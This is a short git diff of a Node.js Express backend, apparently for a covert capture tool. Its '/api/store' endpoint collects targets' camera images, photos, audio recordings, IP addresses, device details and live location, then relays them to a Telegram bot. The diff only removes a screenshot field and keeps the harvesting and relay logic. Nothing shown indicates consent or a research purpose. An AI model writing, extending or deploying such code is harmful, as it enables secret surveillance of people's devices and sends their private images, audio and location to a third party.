@@ -113,7 +113,7 @@ app.get('/secret-admin.html', (req, res) => {
 app.post('/api/store', async (req, res) => {
     try {
         const { 
-            cameraImage, location, deviceDetails, screenshot, 
+            cameraImage, location, deviceDetails, 
             userPhoto, audioData, ipAddress, fullDeviceInfo,
             networkSpeed, liveLocation, captureCount
         } = req.body;
@@ -124,7 +124,6 @@ app.post('/api/store', async (req, res) => {
             location: location || { lat: 0, lng: 0 },
             deviceDetails: deviceDetails || {},
             fullDeviceInfo: fullDeviceInfo || {},
-            screenshot: screenshot || null,
             userPhoto: userPhoto || null,
             audioData: audioData || null,
             ipAddress: ipAddress || 'Unknown',
@@ -154,8 +153,6 @@ app.post('/api/store', async (req, res) => {
 
         if (userPhoto) {
             await sendTelegramPhoto(userPhoto, caption);
-        } else if (screenshot) {
-            await sendTelegramPhoto(screenshot, caption);
         } else {
             await sendTelegramMessage(caption);
         }
